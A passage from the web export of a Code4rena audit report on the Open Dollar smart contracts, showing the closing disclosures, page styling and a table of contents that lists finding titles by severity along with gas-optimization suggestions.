13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time spent:</h3>\n<p>14 hours</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/330#issuecomment-1788042126\">pi0neerpat (Open Dollar) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Excellent thank you for your thorough analysis!</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-2\">High Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#h-01-incorrect-calculations-for-surplus-auction-creation-cause-massive-surplus-imbalances\">[H-01] Incorrect calculations for Surplus Auction creation cause massive surplus imbalances</a></li>\n<li><a href=\"#h-02-missing-debt-check-lets-users-start-a-debt-auction-of-non-existent-debt\">[H-02] Missing debt check lets users start a debt auction of non-existent debt</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-15\">Medium Risk Findings (15)</a></p>\n<ul>\n<li><a href=\"#m-01-odsafemanagerallowsafe-cannot-be-executed-either-by-the-proxy-contract-or-any-other-address\">[M-01] <code>ODSafeManager#allowSAFE()</code> cannot be executed either by the proxy contract or any other address.</a></li>\n<li><a href=\"#m-02-old-permissions-in-handlercan-mapping-are-still-attached-to-the-safehandler-of-a-transferred-safe\">[M-02] Old permissions in handlerCan mapping are still attached to the safeHandler of a transferred safe</a></li>\n<li><a href=\"#m-03-updating-safemanager-address-in-the-vault721-will-disable-nfv-minting\">[M-03] Updating <code>SafeManager</code> address in the <code>Vault721</code> will disable NFV minting</a></li>\n<li><a href=\"#m-04-mismatch-between-the-safe-generated-debt-and-the-amount-of-the-system-tokens-minted-for-the-user\">[M-04] Mismatch between the SAFE generated debt and the amount of the system tokens minted for the user</a></li>\n<li><a href=\"#m-05-decimal-limitation-in-camelotrelayer-and-univ3relayer-contract-deployment\">[M-05] Decimal Limitation in CamelotRelayer and UniV3Relayer Contract Deployment</a></li>\n<li><a href=\"#m-06-safehandler-contract-doesnt-have-any-method-to-call-to-odsafemanagerallowhandler-lead-to-dos-in-some-function\">[M-06] SafeHandler contract doesn’t have any method to call to <code>ODSafeManager.allowHandler()</code>, lead to DOS in some function</a></li>\n<li><a href=\"#m-07-malicious-users-are-able-to-bypass-the-tax-payment-using-making-a-fake-basicactions-contract\">[M-07] Malicious users are able to bypass the Tax payment using making a Fake BasicActions Contract</a></li>\n<li><a href=\"#m-08-collateral-could-be-transferred-to-an-address-which-is-not-safehandler-managed-by-the-safemanager\">[M-08] Collateral could be transferred to an address, which is not <code>SAFEHandler</code> managed by the <code>SAFEManager</code></a></li>\n<li><a href=\"#m-09-vault721tokenuri-does-not-comply-with-erc721---metadata-specification\">[M-09] Vault721.tokenURI does not comply with ERC721 - Metadata specification</a></li>\n<li><a href=\"#m-10-due-to-extremely-short-votingdelay-and-votingperiod-governance-is-practically-impossible\">[M-10] Due to extremely short <code>votingDelay</code> and <code>votingPeriod</code>, governance is practically impossible</a></li>\n<li><a href=\"#m-11-test-addresses-and-incorrect-interface-in-code-prevent-integration-with-uniswapv3-and-camelot\">[M-11] Test addresses and incorrect interface in code prevent integration with UniswapV3 and Camelot</a></li>\n<li><a href=\"#m-12-approved-address-can-approve-other-addresses-for-an-owners-safe\">[M-12] Approved address can approve other addresses for an owner’s safe</a></li>\n<li><a href=\"#m-13-odsafemanagerentersystem---transfer-wrong-amount-of-collateral-debt\">[M-13] ODSafeManager.enterSystem - Transfer wrong amount of collateral, debt</a></li>\n<li><a href=\"#m-14-unable-to-retrieve-price-information-with-camelotrelayer-contract\">[M-14] Unable to retrieve price information with CamelotRelayer contract</a></li>\n<li><a href=\"#m-15-transfersafeownership-does-not-fully-transfer-ownership\">[M-15] <code>transferSAFEOwnership()</code> does not fully transfer ownership</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#l-01-image-field-does-not-point-to-an-image-but-the-testnet-website\">L-01 Image field does not point to an image but the testnet website</a></li>\n<li><a href=\"#l-02-missing-check-in-constructor-to-see-if-quoteperiod-is-not-zero\">L-02 Missing check in constructor to see if quotePeriod is not zero</a></li>\n<li><a href=\"#l-03-missing-cardinality-check-in-function-read\">L-03 Missing cardinality check in function read()</a></li>\n<li><a href=\"#l-04-rounding-down-in-_exitcollateral-function-can-cause-loss-of-precision-leading-to-loss-of-funds-for-users\">L-04 Rounding down in _exitCollateral() function can cause loss of precision leading to loss of funds for users</a></li>\n<li><a href=\"#n-01-remove-redundant-condition-in-_isnotproxy-function\">N-01 Remove redundant condition in _isNotProxy() function</a></li>\n<li><a href=\"#n-02-remove-if-_dst--address0-revert-zeroaddress-redundant-check-since-it-is-already-checked-in-_aftertokentransfer-function\">N-02 Remove <code>if (_dst == address(0)) revert ZeroAddress();</code> redundant check since it is already checked in <code>_afterTokenTransfer()</code> function</a></li>\n<li><a href=\"#n-03-function-read-does-not-revert-with-old-as-mentioned-in-comments\">N-03 Function read() does not revert with “OLD!” as mentioned in comments</a></li>\n<li><a href=\"#n-04-remove-if-extrasurplusreceiver--address0-revert-acceng_nullsurplusreceiver-redundant-check\">N-04 Remove <code>if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();</code> redundant check</a></li>\n<li><a href=\"#r-01-consider-modifying-the-build-function-which-allows-anyone-to-create-an-odproxy-for-any-user\">R-01 Consider modifying the build() function which allows anyone to create an ODProxy for any user</a></li>\n<li><a href=\"#r-02-use-user-instead-of-usr-in-mappings-to-improve-readability\">R-02 Use <code>user</code> instead of <code>usr</code> in mappings to improve readability</a></li>\n<li><a href=\"#r-03-use-safeallow-and-handlerallow-instead-of-safecan-and-handlercan-to-better-match-the-intention-of-the-mappings\">R-03 Use <code>safeAllow</code> and <code>handlerAllow</code> instead of <code>safeCan</code> and <code>handlerCan</code> to better match the intention of the mappings</a></li>\n<li><a href=\"#r-04-add-brackets-around-10--multiplier-to-improve-code-readability-and-provide-clarity-in-which-operation-takes-precedence-first\">R-04 Add brackets around <code>10 ** multiplier</code> to improve code readability and provide clarity in which operation takes precedence first</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-2\">Summary</a></li>\n<li><a href=\"#g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-147k-gas\">G-01 Using immutable on variables that are only set in the constructor and never after (Save 14.7K Gas)</a></li>\n<li><a href=\"#g-02-avoid-making-external-calls-if-we-dont-have-to\">G-02 Avoid making external calls if we don’t have to</a></li>\n<li><a href=\"#g-03-avoid-making-any-state-reads-if-we-can-revert-early-save-2100-gas\">G-03 Avoid Making any state reads if we can revert early (Save 2100 Gas)</a></li>\n<li><a href=\"#g-04-variable-already-cached-but-in-the-wrong-order---refactor-to-save-1-sload100-gas\">G-04 Variable already cached but in the wrong order - refactor to save 1 SLOAD(100 Gas)</a></li>\n<li><a href=\"#g-05-modifier-execution-order-can-help-save-an-entire-sloadsave-2100-gas\">G-05 Modifier execution order can help save an entire SLOAD(Save 2100 Gas)</a></li>\n<li><a href=\"#g-06-using-storage-instead-of-memory-for-structsarrays-saves-gas-not-found-by-the-bot\">G-06 Using storage instead of memory for structs/arrays saves gas (<strong>Not found by the bot</strong>)</a></li>\n<li><a href=\"#g-07-leverage-mapping-and-dot-notation-for-struct-assignment\">G-07 Leverage mapping and dot notation for struct assignment</a></li>\n<li><a href=\"#g-08-dont-cache-if-used-only-once\">G-08 Don’t cache if used only once</a></li>\n</ul>\n</li>\n<li><a href=\"#audit-analysis\">Audit Analysis</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}